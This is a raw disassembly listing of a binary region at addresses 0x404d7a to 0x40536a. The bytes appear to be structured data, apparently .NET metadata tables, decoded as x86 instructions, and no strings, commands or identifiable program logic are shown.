  404d7a:	96                   	xchg   %eax,%esi
  404d7b:	00 20                	add    %ah,(%eax)
  404d7d:	0a 6a 06             	or     0x6(%edx),%ch
  404d80:	21 00                	and    %eax,(%eax)
  404d82:	e8 37 00 00 00       	call   0x404dbe
  404d87:	00 96 00 6e 15 c3    	add    %dl,-0x3cea9200(%esi)
  404d8d:	01 23                	add    %esp,(%ebx)
  404d8f:	00 30                	add    %dh,(%eax)
  404d91:	38 00                	cmp    %al,(%eax)
  404d93:	00 00                	add    %al,(%eax)
  404d95:	00 96 00 cf 15 c3    	add    %dl,-0x3cea3100(%esi)
  404d9b:	01 23                	add    %esp,(%ebx)
  404d9d:	00 70 38             	add    %dh,0x38(%eax)
  404da0:	00 00                	add    %al,(%eax)
  404da2:	00 00                	add    %al,(%eax)
  404da4:	96                   	xchg   %eax,%esi
  404da5:	00 1b                	add    %bl,(%ebx)
  404da7:	09 72 06             	or     %esi,0x6(%edx)
  404daa:	23 00                	and    (%eax),%eax
  404dac:	dc 38                	fdivrl (%eax)
  404dae:	00 00                	add    %al,(%eax)
  404db0:	00 00                	add    %al,(%eax)
  404db2:	96                   	xchg   %eax,%esi
  404db3:	00 12                	add    %dl,(%edx)
  404db5:	09 62 00             	or     %esp,0x0(%edx)
  404db8:	25 00 4c 39 00       	and    $0x394c00,%eax
  404dbd:	00 00                	add    %al,(%eax)
  404dbf:	00 96 00 06 09 36    	add    %dl,0x36090600(%esi)
  404dc5:	00 26                	add    %ah,(%esi)
  404dc7:	00 b8 39 00 00 00    	add    %bh,0x39(%eax)
  404dcd:	00 96 00 eb 17 d0    	add    %dl,-0x2fe81500(%esi)
  404dd3:	02 27                	add    (%edi),%ah
  404dd5:	00 28                	add    %ch,(%eax)
  404dd7:	3a 00                	cmp    (%eax),%al
  404dd9:	00 00                	add    %al,(%eax)
  404ddb:	00 91 18 e9 11 c3    	add    %dl,-0x3cee16e8(%ecx)
  404de1:	01 27                	add    %esp,(%edi)
  404de3:	00 40 3a             	add    %al,0x3a(%eax)
  404de6:	00 00                	add    %al,(%eax)
  404de8:	00 00                	add    %al,(%eax)
  404dea:	96                   	xchg   %eax,%esi
  404deb:	00 4b 02             	add    %cl,0x2(%ebx)
  404dee:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  404def:	01 27                	add    %esp,(%edi)
  404df1:	00 a8 3c 00 00 00    	add    %ch,0x3c(%eax)
  404df7:	00 91 00 90 04 79    	add    %dl,0x79049000(%ecx)
  404dfd:	06                   	push   %es
  404dfe:	28 00                	sub    %al,(%eax)
  404e00:	d0 3d 00 00 00 00    	sarb   $1,0x0
  404e06:	91                   	xchg   %eax,%ecx
  404e07:	00 9c 02 c3 01 29 00 	add    %bl,0x2901c3(%edx,%eax,1)
  404e0e:	14 3e                	adc    $0x3e,%al
  404e10:	00 00                	add    %al,(%eax)
  404e12:	00 00                	add    %al,(%eax)
  404e14:	96                   	xchg   %eax,%esi
  404e15:	00 aa 11 e3 00 29    	add    %ch,0x2900e311(%edx)
  404e1b:	00 5c 3e 00          	add    %bl,0x0(%esi,%edi,1)
  404e1f:	00 00                	add    %al,(%eax)
  404e21:	00 91 18 e9 11 c3    	add    %dl,-0x3cee16e8(%ecx)
  404e27:	01 2a                	add    %ebp,(%edx)
  404e29:	00 68 3e             	add    %ch,0x3e(%eax)
  404e2c:	00 00                	add    %al,(%eax)
  404e2e:	00 00                	add    %al,(%eax)
  404e30:	86 18                	xchg   %bl,(%eax)
  404e32:	e3 11                	jecxz  0x404e45
  404e34:	10 00                	adc    %al,(%eax)
  404e36:	2a 00                	sub    (%eax),%al
  404e38:	e0 3e                	loopne 0x404e78
  404e3a:	00 00                	add    %al,(%eax)
  404e3c:	00 00                	add    %al,(%eax)
  404e3e:	86 00                	xchg   %al,(%eax)
  404e40:	0b 17                	or     (%edi),%edx
  404e42:	ce                   	into
  404e43:	00 2b                	add    %ch,(%ebx)
  404e45:	00 08                	add    %cl,(%eax)
  404e47:	3f                   	aas
  404e48:	00 00                	add    %al,(%eax)
  404e4a:	00 00                	add    %al,(%eax)
  404e4c:	86 00                	xchg   %al,(%eax)
  404e4e:	0b 17                	or     (%edi),%edx
  404e50:	aa                   	stos   %al,%es:(%edi)
  404e51:	02 2c 00             	add    (%eax,%eax,1),%ch
  404e54:	70 40                	jo     0x404e96
  404e56:	00 00                	add    %al,(%eax)
  404e58:	00 00                	add    %al,(%eax)
  404e5a:	86 00                	xchg   %al,(%eax)
  404e5c:	03 17                	add    (%edi),%edx
  404e5e:	ce                   	into
  404e5f:	00 2d 00 98 40 00    	add    %ch,0x409800
  404e65:	00 00                	add    %al,(%eax)
  404e67:	00 86 00 03 17 aa    	add    %al,-0x55e8fd00(%esi)
  404e6d:	02 2e                	add    (%esi),%ch
  404e6f:	00 60 42             	add    %ah,0x42(%eax)
  404e72:	00 00                	add    %al,(%eax)
  404e74:	48                   	dec    %eax
  404e75:	00 81 00 ce 0c 80    	add    %al,-0x7ff33200(%ecx)
  404e7b:	06                   	push   %es
  404e7c:	2f                   	das
  404e7d:	00 9c 42 00 00 00 00 	add    %bl,0x0(%edx,%eax,2)
  404e84:	91                   	xchg   %eax,%ecx
  404e85:	18 e9                	sbb    %ch,%cl
  404e87:	11 c3                	adc    %eax,%ebx
  404e89:	01 31                	add    %esi,(%ecx)
  404e8b:	00 b8 42 00 00 00    	add    %bh,0x42(%eax)
  404e91:	00 96 00 32 0b 5d    	add    %dl,0x5d0b3200(%esi)
  404e97:	00 31                	add    %dh,(%ecx)
  404e99:	00 44 43 00          	add    %al,0x0(%ebx,%eax,2)
  404e9d:	00 00                	add    %al,(%eax)
  404e9f:	00 96 00 32 0b fe    	add    %dl,-0x1f4ce00(%esi)
  404ea5:	03 32                	add    (%edx),%esi
  404ea7:	00 00                	add    %al,(%eax)
  404ea9:	00 01                	add    %al,(%ecx)
  404eab:	00 24 09             	add    %ah,(%ecx,%ecx,1)
  404eae:	00 00                	add    %al,(%eax)
  404eb0:	01 00                	add    %eax,(%eax)
  404eb2:	24 09                	and    $0x9,%al
  404eb4:	00 00                	add    %al,(%eax)
  404eb6:	01 00                	add    %eax,(%eax)
  404eb8:	24 09                	and    $0x9,%al
  404eba:	00 00                	add    %al,(%eax)
  404ebc:	01 00                	add    %eax,(%eax)
  404ebe:	24 09                	and    $0x9,%al
  404ec0:	00 00                	add    %al,(%eax)
  404ec2:	01 00                	add    %eax,(%eax)
  404ec4:	24 09                	and    $0x9,%al
  404ec6:	00 00                	add    %al,(%eax)
  404ec8:	01 00                	add    %eax,(%eax)
  404eca:	24 09                	and    $0x9,%al
  404ecc:	00 00                	add    %al,(%eax)
  404ece:	01 00                	add    %eax,(%eax)
  404ed0:	24 09                	and    $0x9,%al
  404ed2:	00 00                	add    %al,(%eax)
  404ed4:	01 00                	add    %eax,(%eax)
  404ed6:	24 09                	and    $0x9,%al
  404ed8:	00 00                	add    %al,(%eax)
  404eda:	01 00                	add    %eax,(%eax)
  404edc:	24 09                	and    $0x9,%al
  404ede:	00 00                	add    %al,(%eax)
  404ee0:	01 00                	add    %eax,(%eax)
  404ee2:	24 09                	and    $0x9,%al
  404ee4:	00 00                	add    %al,(%eax)
  404ee6:	01 00                	add    %eax,(%eax)
  404ee8:	bc 0b 00 00 01       	mov    $0x100000b,%esp
  404eed:	00 2d 06 00 00 01    	add    %ch,0x1000006
  404ef3:	00 92 10 00 00 02    	add    %dl,0x2000010(%edx)
  404ef9:	00 08                	add    %cl,(%eax)
  404efb:	07                   	pop    %es
  404efc:	00 00                	add    %al,(%eax)
  404efe:	03 00                	add    (%eax),%eax
  404f00:	26 0e                	es push %cs
  404f02:	00 00                	add    %al,(%eax)
  404f04:	04 00                	add    $0x0,%al
  404f06:	7b 14                	jnp    0x404f1c
  404f08:	00 00                	add    %al,(%eax)
  404f0a:	01 00                	add    %eax,(%eax)
  404f0c:	12 10                	adc    (%eax),%dl
  404f0e:	00 00                	add    %al,(%eax)
  404f10:	01 00                	add    %eax,(%eax)
  404f12:	28 0b                	sub    %cl,(%ebx)
  404f14:	00 00                	add    %al,(%eax)
  404f16:	01 00                	add    %eax,(%eax)
  404f18:	bc 0b 00 00 01       	mov    $0x100000b,%esp
  404f1d:	00 bc 0b 00 00 01 00 	add    %bh,0x10000(%ebx,%ecx,1)
  404f24:	3e 0b 00             	or     %ds:(%eax),%eax
  404f27:	00 01                	add    %al,(%ecx)
  404f29:	00 19                	add    %bl,(%ecx)
  404f2b:	15 00 00 01 00       	adc    $0x10000,%eax
  404f30:	d5 03                	aad    $0x3
  404f32:	00 00                	add    %al,(%eax)
  404f34:	02 00                	add    (%eax),%al
  404f36:	6d                   	insl   (%dx),%es:(%edi)
  404f37:	17                   	pop    %ss
  404f38:	00 00                	add    %al,(%eax)
  404f3a:	03 00                	add    (%eax),%eax
  404f3c:	f1                   	int1
  404f3d:	16                   	push   %ss
  404f3e:	00 00                	add    %al,(%eax)
  404f40:	01 00                	add    %eax,(%eax)
  404f42:	c7 05 00 00 01 00 8b 	movl   $0x148b,0x10000
  404f49:	14 00 00 
  404f4c:	02 00                	add    (%eax),%al
  404f4e:	af                   	scas   %es:(%edi),%eax
  404f4f:	16                   	push   %ss
  404f50:	00 00                	add    %al,(%eax)
  404f52:	01 00                	add    %eax,(%eax)
  404f54:	8e 13                	mov    (%ebx),%ss
  404f56:	00 00                	add    %al,(%eax)
  404f58:	01 00                	add    %eax,(%eax)
  404f5a:	35 00 00 00 02       	xor    $0x2000000,%eax
  404f5f:	00 88 00 00 00 03    	add    %cl,0x3000000(%eax)
  404f65:	00 8b 00 00 00 01    	add    %cl,0x1000000(%ebx)
  404f6b:	00 92 10 00 00 02    	add    %dl,0x2000010(%edx)
  404f71:	00 c6                	add    %al,%dh
  404f73:	09 00                	or     %eax,(%eax)
  404f75:	00 01                	add    %al,(%ecx)
  404f77:	00 2d 06 00 00 02    	add    %ch,0x2000006
  404f7d:	00 24 09             	add    %ah,(%ecx,%ecx,1)
  404f80:	00 00                	add    %al,(%eax)
  404f82:	01 00                	add    %eax,(%eax)
  404f84:	24 09                	and    $0x9,%al
  404f86:	00 00                	add    %al,(%eax)
  404f88:	01 00                	add    %eax,(%eax)
  404f8a:	2d 06 00 00 01       	sub    $0x1000006,%eax
  404f8f:	00 e3                	add    %ah,%bl
  404f91:	01 00                	add    %eax,(%eax)
  404f93:	00 01                	add    %al,(%ecx)
  404f95:	00 23                	add    %ah,(%ebx)
  404f97:	0c 00                	or     $0x0,%al
  404f99:	00 01                	add    %al,(%ecx)
  404f9b:	00 ad 17 00 00 01    	add    %ch,0x1000017(%ebp)
  404fa1:	00 1a                	add    %bl,(%edx)
  404fa3:	18 00                	sbb    %al,(%eax)
  404fa5:	00 01                	add    %al,(%ecx)
  404fa7:	00 44 17 00          	add    %al,0x0(%edi,%edx,1)
  404fab:	00 01                	add    %al,(%ecx)
  404fad:	00 44 17 00          	add    %al,0x0(%edi,%edx,1)
  404fb1:	00 01                	add    %al,(%ecx)
  404fb3:	00 44 17 00          	add    %al,0x0(%edi,%edx,1)
  404fb7:	00 01                	add    %al,(%ecx)
  404fb9:	00 44 17 00          	add    %al,0x0(%edi,%edx,1)
  404fbd:	00 01                	add    %al,(%ecx)
  404fbf:	00 32                	add    %dh,(%edx)
  404fc1:	00 00                	add    %al,(%eax)
  404fc3:	00 02                	add    %al,(%edx)
  404fc5:	00 74 00 00          	add    %dh,0x0(%eax,%eax,1)
  404fc9:	00 01                	add    %al,(%ecx)
  404fcb:	00 44 17 00          	add    %al,0x0(%edi,%edx,1)
  404fcf:	00 01                	add    %al,(%ecx)
  404fd1:	00 44 17 09          	add    %al,0x9(%edi,%edx,1)
  404fd5:	00 e3                	add    %ah,%bl
  404fd7:	11 01                	adc    %eax,(%ecx)
  404fd9:	00 11                	add    %dl,(%ecx)
  404fdb:	00 e3                	add    %ah,%bl
  404fdd:	11 06                	adc    %eax,(%esi)
  404fdf:	00 19                	add    %bl,(%ecx)
  404fe1:	00 e3                	add    %ah,%bl
  404fe3:	11 0a                	adc    %ecx,(%edx)
  404fe5:	00 29                	add    %ch,(%ecx)
  404fe7:	00 e3                	add    %ah,%bl
  404fe9:	11 10                	adc    %edx,(%eax)
  404feb:	00 31                	add    %dh,(%ecx)
  404fed:	00 e3                	add    %ah,%bl
  404fef:	11 10                	adc    %edx,(%eax)
  404ff1:	00 39                	add    %bh,(%ecx)
  404ff3:	00 e3                	add    %ah,%bl
  404ff5:	11 10                	adc    %edx,(%eax)
  404ff7:	00 41 00             	add    %al,0x0(%ecx)
  404ffa:	e3 11                	jecxz  0x40500d
  404ffc:	10 00                	adc    %al,(%eax)
  404ffe:	49                   	dec    %ecx
  404fff:	00 e3                	add    %ah,%bl
  405001:	11 10                	adc    %edx,(%eax)
  405003:	00 51 00             	add    %dl,0x0(%ecx)
  405006:	e3 11                	jecxz  0x405019
  405008:	10 00                	adc    %al,(%eax)
  40500a:	59                   	pop    %ecx
  40500b:	00 e3                	add    %ah,%bl
  40500d:	11 10                	adc    %edx,(%eax)
  40500f:	00 61 00             	add    %ah,0x0(%ecx)
  405012:	e3 11                	jecxz  0x405025
  405014:	15 00 69 00 e3       	adc    $0xe3006900,%eax
  405019:	11 10                	adc    %edx,(%eax)
  40501b:	00 71 00             	add    %dh,0x0(%ecx)
  40501e:	e3 11                	jecxz  0x405031
  405020:	10 00                	adc    %al,(%eax)
  405022:	99                   	cltd
  405023:	00 e3                	add    %ah,%bl
  405025:	11 06                	adc    %eax,(%esi)
  405027:	00 a9 00 e3 11 1a    	add    %ch,0x1a11e300(%ecx)
  40502d:	00 01                	add    %al,(%ecx)
  40502f:	01 ca                	add    %ecx,%edx
  405031:	0f 2c 00             	cvttps2pi (%eax),%mm0
  405034:	11 02                	adc    %eax,(%edx)
  405036:	65 00 31             	add    %dh,%gs:(%ecx)
  405039:	00 19                	add    %bl,(%ecx)
  40503b:	02 cf                	add    %bh,%cl
  40503d:	15 2c 00 11 02       	adc    $0x211002c,%eax
  405042:	05 0e 36 00 79       	add    $0x7900360e,%eax
  405047:	00 e3                	add    %ah,%bl
  405049:	11 06                	adc    %eax,(%esi)
  40504b:	00 81 00 03 18 45    	add    %al,0x45180300(%ecx)
  405051:	00 21                	add    %ah,(%ecx)
  405053:	02 ce                	add    %dh,%cl
  405055:	17                   	pop    %ss
  405056:	4b                   	dec    %ebx
  405057:	00 31                	add    %dh,(%ecx)
  405059:	02 b4 00 51 00 31 02 	add    0x2310051(%eax,%eax,1),%dh
  405060:	5b                   	pop    %ebx
  405061:	13 57 00             	adc    0x0(%edi),%edx
  405064:	39 02                	cmp    %eax,(%edx)
  405066:	50                   	push   %eax
  405067:	01 5d 00             	add    %ebx,0x0(%ebp)
  40506a:	11 02                	adc    %eax,(%edx)
  40506c:	75 0a                	jne    0x405078
  40506e:	62 00                	bound  %eax,(%eax)
  405070:	89 00                	mov    %eax,(%eax)
  405072:	50                   	push   %eax
  405073:	0b 68 00             	or     0x0(%eax),%ebp
  405076:	b1 00                	mov    $0x0,%cl
  405078:	e3 11                	jecxz  0x40508b
  40507a:	8a 00                	mov    (%eax),%al
  40507c:	b1 00                	mov    $0x0,%cl
  40507e:	a6                   	cmpsb  %es:(%edi),%ds:(%esi)
  40507f:	09 01                	or     %eax,(%ecx)
  405081:	00 b1 00 93 09 01    	add    %dh,0x1099300(%ecx)
  405087:	00 59 02             	add    %bl,0x2(%ecx)
  40508a:	93                   	xchg   %eax,%ebx
  40508b:	18 97 00 59 02 c1    	sbb    %dl,-0x3efda700(%edi)
  405091:	15 9d 00 69 02       	adc    $0x269009d,%eax
  405096:	e3 11                	jecxz  0x4050a9
  405098:	06                   	push   %es
  405099:	00 69 02             	add    %ch,0x2(%ecx)
  40509c:	4e                   	dec    %esi
  40509d:	17                   	pop    %ss
  40509e:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  40509f:	00 71 02             	add    %dh,0x2(%ecx)
  4050a2:	d4 12                	aam    $0x12
  4050a4:	a9 00 b1 00 4d       	test   $0x4d00b100,%eax
  4050a9:	15 b0 00 b1 00       	adc    $0xb100b0,%eax
  4050ae:	6e                   	outsb  %ds:(%esi),(%dx)
  4050af:	02 b7 00 b1 00 4d    	add    0x4d00b100(%edi),%dh
  4050b5:	15 bb 00 d1 00       	adc    $0xd100bb,%eax
  4050ba:	e3 11                	jecxz  0x4050cd
  4050bc:	06                   	push   %es
  4050bd:	00 d9                	add    %bl,%cl
  4050bf:	00 e3                	add    %ah,%bl
  4050c1:	11 c1                	adc    %eax,%ecx
  4050c3:	00 d1                	add    %dl,%cl
  4050c5:	00 f9                	add    %bh,%cl
  4050c7:	13 c7                	adc    %edi,%eax
  4050c9:	00 d1                	add    %dl,%cl
  4050cb:	00 95 0a ce 00 59    	add    %dl,0x5900ce0a(%ebp)
  4050d1:	02 c1                	add    %cl,%al
  4050d3:	15 d3 00 69 02       	adc    $0x26900d3,%eax
  4050d8:	4e                   	dec    %esi
  4050d9:	17                   	pop    %ss
  4050da:	dd 00                	fldl   (%eax)
  4050dc:	89 02                	mov    %eax,(%edx)
  4050de:	cb                   	lret
  4050df:	06                   	push   %es
  4050e0:	06                   	push   %es
  4050e1:	00 91 02 5d 06 e3    	add    %dl,-0x1cf9a2fe(%ecx)
  4050e7:	00 99 02 e3 11 e8    	add    %bl,-0x17ee1cfe(%ecx)
  4050ed:	00 a1 02 e3 11 ef    	add    %ah,-0x10ee1cfe(%ecx)
  4050f3:	00 b9 00 e3 11 f5    	add    %bh,-0xaee1d00(%ecx)
  4050f9:	00 b1 00 c1 16 00    	add    %dh,0x16c100(%ecx)
  4050ff:	01 79 00             	add    %edi,0x0(%ecx)
  405102:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  405103:	0a 06                	or     (%esi),%al
  405105:	01 b9 00 4a 16 0a    	add    %edi,0xa164a00(%ecx)
  40510b:	01 d1                	add    %edx,%ecx
  40510d:	02 e3                	add    %bl,%ah
  40510f:	11 ef                	adc    %ebp,%edi
  405111:	00 c1                	add    %al,%cl
  405113:	00 e3                	add    %ah,%bl
  405115:	11 16                	adc    %edx,(%esi)
  405117:	01 d9                	add    %ebx,%ecx
  405119:	02 e3                	add    %bl,%ah
  40511b:	11 ef                	adc    %ebp,%edi
  40511d:	00 a9 02 46 02 20    	add    %ch,0x20024602(%ecx)
  405123:	01 e1                	add    %esp,%ecx
  405125:	02 1f                	add    (%edi),%bl
  405127:	06                   	push   %es
  405128:	2d 01 a9 02 cb       	sub    $0xcb02a901,%eax
  40512d:	06                   	push   %es
  40512e:	06                   	push   %es
  40512f:	00 b1 00 cb 06 06    	add    %dh,0x606cb00(%ecx)
  405135:	00 c1                	add    %al,%cl
  405137:	00 cb                	add    %cl,%bl
  405139:	06                   	push   %es
  40513a:	06                   	push   %es
  40513b:	00 a9 02 3e 02 45    	add    %ch,0x45023e02(%ecx)
  405141:	01 f1                	add    %esi,%ecx
  405143:	02 65 00             	add    0x0(%ebp),%ah
  405146:	4b                   	dec    %ebx
  405147:	01 f9                	add    %edi,%ecx
  405149:	02 a4 0a 06 01 59 02 	add    0x2590106(%edx,%ecx,1),%ah
  405150:	06                   	push   %es
  405151:	15 52 01 a9 02       	adc    $0x2a90152,%eax
  405156:	4b                   	dec    %ebx
  405157:	02 59 01             	add    0x1(%ecx),%bl
  40515a:	01 03                	add    %eax,(%ebx)
  40515c:	e3 11                	jecxz  0x40516f
  40515e:	ef                   	out    %eax,(%dx)
  40515f:	00 01                	add    %al,(%ecx)
  405161:	01 e3                	add    %esp,%ebx
  405163:	11 61 01             	adc    %esp,0x1(%ecx)
  405166:	01 01                	add    %eax,(%ecx)
  405168:	26 17                	es pop %ss
  40516a:	68 01 09 03 8f       	push   $0x8f030901
  40516f:	11 7d 01             	adc    %edi,0x1(%ebp)
  405172:	f1                   	int1
  405173:	02 5b 13             	add    0x13(%ebx),%bl
  405176:	84 01                	test   %al,(%ecx)
  405178:	b1 00                	mov    $0x0,%cl
  40517a:	27                   	daa
  40517b:	0d 8a 01 a9 02       	or     $0x2a9018a,%eax
  405180:	5a                   	pop    %edx
  405181:	07                   	pop    %es
  405182:	92                   	xchg   %eax,%edx
  405183:	01 09                	add    %ecx,(%ecx)
  405185:	01 e3                	add    %esp,%ebx
  405187:	11 9a 01 a9 02 0c    	adc    %ebx,0xc02a901(%edx)
  40518d:	0f a0                	push   %fs
  40518f:	01 a9 02 5b 0b 06    	add    %ebp,0x60b5b02(%ecx)
  405195:	00 09                	add    %cl,(%ecx)
  405197:	03 cf                	add    %edi,%ecx
  405199:	15 a5 01 11 01       	adc    $0x11101a5,%eax
  40519e:	e3 11                	jecxz  0x4051b1
  4051a0:	06                   	push   %es
  4051a1:	00 11                	add    %dl,(%ecx)
  4051a3:	01 35 15 b1 01 11    	add    %esi,0x1101b115
  4051a9:	01 ba 0a 10 00 59    	add    %edi,0x5900100a(%edx)
  4051af:	02 e3                	add    %bl,%ah
  4051b1:	11 b8 01 11 01 13    	adc    %edi,0x13011101(%eax)
  4051b7:	13 be 01 19 03 45    	adc    0x45031901(%esi),%edi
  4051bd:	15 c3 01 19 02       	adc    $0x21901c3,%eax
  4051c2:	ac                   	lods   %ds:(%esi),%al
  4051c3:	12 5d 00             	adc    0x0(%ebp),%bl
  4051c6:	21 03                	and    %eax,(%ebx)
  4051c8:	67 06                	addr16 push %es
  4051ca:	eb 01                	jmp    0x4051cd
  4051cc:	19 01                	sbb    %eax,(%ecx)
  4051ce:	e3 11                	jecxz  0x4051e1
  4051d0:	10 00                	adc    %al,(%eax)
  4051d2:	29 01                	sub    %eax,(%ecx)
  4051d4:	94                   	xchg   %eax,%esp
  4051d5:	14 f1                	adc    $0xf1,%al
  4051d7:	01 29                	add    %ebp,(%ecx)
  4051d9:	01 48 05             	add    %ecx,0x5(%eax)
  4051dc:	f7 01 29 03 91 05    	testl  $0x5910329,(%ecx)
  4051e2:	06                   	push   %es
  4051e3:	01 31                	add    %esi,(%ecx)
  4051e5:	03 f3                	add    %ebx,%esi
  4051e7:	05 06 01 59 02       	add    $0x2590106,%eax
  4051ec:	9f                   	lahf
  4051ed:	18 97 00 29 01 c7    	sbb    %dl,-0x38fed700(%edi)
  4051f3:	12 fd                	adc    %ch,%bh
  4051f5:	01 29                	add    %ebp,(%ecx)
  4051f7:	01 22                	add    %esp,(%edx)
  4051f9:	0d 06 00 31 01       	or     $0x1310006,%eax
  4051fe:	e3 11                	jecxz  0x405211
  405200:	06                   	push   %es
  405201:	00 31                	add    %dh,(%ecx)
  405203:	01 9e 05 10 00 31    	add    %ebx,0x31001005(%esi)
  405209:	03 88 05 06 01 21    	add    0x21010605(%eax),%ecx
  40520f:	03 5e 0e             	add    0xe(%esi),%ebx
  405212:	5d                   	pop    %ebp
  405213:	00 59 02             	add    %bl,0x2(%ecx)
  405216:	06                   	push   %es
  405217:	15 04 02 31 01       	adc    $0x1310204,%eax
  40521c:	ce                   	into
  40521d:	14 10                	adc    $0x10,%al
  40521f:	00 31                	add    %dh,(%ecx)
  405221:	01 65 05             	add    %esp,0x5(%ebp)
  405224:	0a 02                	or     (%edx),%al
  405226:	31 01                	xor    %eax,(%ecx)
  405228:	86 17                	xchg   %dl,(%edi)
  40522a:	15 00 29 01 26       	adc    $0x26012900,%eax
  40522f:	17                   	pop    %ss
  405230:	11 02                	adc    %eax,(%edx)
  405232:	41                   	inc    %ecx
  405233:	03 6b 11             	add    0x11(%ebx),%ebp
  405236:	1a 02                	sbb    (%edx),%al
  405238:	49                   	dec    %ecx
  405239:	03 d3                	add    %ebx,%edx
  40523b:	06                   	push   %es
  40523c:	5d                   	pop    %ebp
  40523d:	00 39                	add    %bh,(%ecx)
  40523f:	01 f8                	add    %edi,%eax
  405241:	17                   	pop    %ss
  405242:	1f                   	pop    %ds
  405243:	02 39                	add    (%ecx),%bh
  405245:	01 1b                	add    %ebx,(%ebx)
  405247:	09 29                	or     %ebp,(%ecx)
  405249:	02 59 03             	add    0x3(%ecx),%bl
  40524c:	ef                   	out    %eax,(%dx)
  40524d:	14 36                	adc    $0x36,%al
  40524f:	00 59 03             	add    %bl,0x3(%ecx)
  405252:	4a                   	dec    %edx
  405253:	07                   	pop    %es
  405254:	e3 00                	jecxz  0x405256
  405256:	21 01                	and    %eax,(%ecx)
  405258:	e3 11                	jecxz  0x40526b
  40525a:	2f                   	das
  40525b:	02 59 03             	add    0x3(%ecx),%bl
  40525e:	33 13                	xor    (%ebx),%edx
  405260:	62 00                	bound  %eax,(%eax)
  405262:	21 03                	and    %eax,(%ebx)
  405264:	ab                   	stos   %eax,%es:(%edi)
  405265:	05 37 02 59 02       	add    $0x2590237,%eax
  40526a:	06                   	push   %es
  40526b:	15 eb 01 41 01       	adc    $0x14101eb,%eax
  405270:	e3 11                	jecxz  0x405283
  405272:	10 00                	adc    %al,(%eax)
  405274:	69 03 5d 06 10 00    	imul   $0x10065d,(%ebx),%eax
  40527a:	21 03                	and    %eax,(%ebx)
  40527c:	74 0b                	je     0x405289
  40527e:	37                   	aaa
  40527f:	02 21                	add    (%ecx),%ah
  405281:	03 bb 05 5d 00 31    	add    0x31005d05(%ebx),%edi
  405287:	01 18                	add    %ebx,(%eax)
  405289:	0b 15 00 31 01 ed    	or     0xed013100,%edx
  40528f:	08 15 00 91 00 74    	or     %dl,0x74009100
  405295:	04 06                	add    $0x6,%al
  405297:	01 19                	add    %ebx,(%ecx)
  405299:	02 34 17             	add    (%edi,%edx,1),%dh
  40529c:	e3 00                	jecxz  0x40529e
  40529e:	19 02                	sbb    %eax,(%edx)
  4052a0:	73 18                	jae    0x4052ba
  4052a2:	37                   	aaa
  4052a3:	02 21                	add    (%ecx),%ah
  4052a5:	03 f7                	add    %edi,%esi
  4052a7:	16                   	push   %ss
  4052a8:	5d                   	pop    %ebp
  4052a9:	00 71 03             	add    %dh,0x3(%ecx)
  4052ac:	e3 11                	jecxz  0x4052bf
  4052ae:	10 00                	adc    %al,(%eax)
  4052b0:	71 03                	jno    0x4052b5
  4052b2:	67 09 41 02          	or     %eax,0x2(%bx,%di)
  4052b6:	79 03                	jns    0x4052bb
  4052b8:	e3 11                	jecxz  0x4052cb
  4052ba:	06                   	push   %es
  4052bb:	00 79 03             	add    %bh,0x3(%ecx)
  4052be:	e4 05                	in     $0x5,%al
  4052c0:	06                   	push   %es
  4052c1:	01 59 02             	add    %ebx,0x2(%ecx)
  4052c4:	a2 11 06 01 59       	mov    %al,0x59010611
  4052c9:	02 2f                	add    (%edi),%ch
  4052cb:	14 4a                	adc    $0x4a,%al
  4052cd:	02 49 01             	add    0x1(%ecx),%cl
  4052d0:	e3 11                	jecxz  0x4052e3
  4052d2:	10 00                	adc    %al,(%eax)
  4052d4:	49                   	dec    %ecx
  4052d5:	01 5f 15             	add    %ebx,0x15(%edi)
  4052d8:	61                   	popa
  4052d9:	02 51 01             	add    0x1(%ecx),%dl
  4052dc:	cb                   	lret
  4052dd:	11 67 02             	adc    %esp,0x2(%edi)
  4052e0:	59                   	pop    %ecx
  4052e1:	01 7d 16             	add    %edi,0x16(%ebp)
  4052e4:	6d                   	insl   (%dx),%es:(%edi)
  4052e5:	02 61 01             	add    0x1(%ecx),%ah
  4052e8:	7e 0d                	jle    0x4052f7
  4052ea:	73 02                	jae    0x4052ee
  4052ec:	59                   	pop    %ecx
  4052ed:	02 e6                	add    %dh,%ah
  4052ef:	15 06 01 59 01       	adc    $0x1590106,%eax
  4052f4:	4a                   	dec    %edx
  4052f5:	17                   	pop    %ss
  4052f6:	b7 00                	mov    $0x0,%bh
  4052f8:	29 01                	sub    %eax,(%ecx)
  4052fa:	ae                   	scas   %es:(%edi),%al
  4052fb:	04 78                	add    $0x78,%al
  4052fd:	02 81 03 65 00 82    	add    -0x7dff9afd(%ecx),%al
  405303:	02 19                	add    (%ecx),%bl
  405305:	02 de                	add    %dh,%bl
  405307:	16                   	push   %ss
  405308:	8a 02                	mov    (%edx),%al
  40530a:	19 02                	sbb    %eax,(%edx)
  40530c:	12 06                	adc    (%esi),%al
  40530e:	37                   	aaa
  40530f:	02 19                	add    (%ecx),%bl
  405311:	02 d4                	add    %ah,%dl
  405313:	05 37 02 19 02       	add    $0x2190237,%eax
  405318:	7a 0e                	jp     0x405328
  40531a:	8e 02                	mov    (%edx),%es
  40531c:	59                   	pop    %ecx
  40531d:	02 06                	add    (%esi),%al
  40531f:	15 94 02 69 01       	adc    $0x1690294,%eax
  405324:	e3 11                	jecxz  0x405337
  405326:	06                   	push   %es
  405327:	00 31                	add    %dh,(%ecx)
  405329:	02 7a 01             	add    0x1(%edx),%bh
  40532c:	51                   	push   %ecx
  40532d:	00 99 03 32 0b aa    	add    %bl,-0x55f4cdfd(%ecx)
  405333:	02 71 01             	add    0x1(%ecx),%dh
  405336:	e3 11                	jecxz  0x405349
  405338:	06                   	push   %es
  405339:	00 c9                	add    %cl,%cl
  40533b:	02 a4 0a ce 00 71 01 	add    0x17100ce(%edx,%ecx,1),%ah
  405342:	df 03                	filds  (%ebx)
  405344:	b1 02                	mov    $0x2,%cl
  405346:	59                   	pop    %ecx
  405347:	02 dd                	add    %ch,%bl
  405349:	0a b8 02 59 02 50    	or     0x50025902(%eax),%bh
  40534f:	11 06                	adc    %eax,(%esi)
  405351:	01 59 02             	add    %ebx,0x2(%ecx)
  405354:	f8                   	clc
  405355:	03 ca                	add    %edx,%ecx
  405357:	02 19                	add    (%ecx),%bl
  405359:	02 87 0d d0 02 a1    	add    -0x5efd2ff3(%edi),%al
  40535f:	03 a4 0a 06 01 a9 03 	add    0x3a90106(%edx,%ecx,1),%esp
  405366:	61                   	popa
  405367:	0b 37                	or     (%edi),%esi
  405369:	02 31                	add    (%ecx),%dh
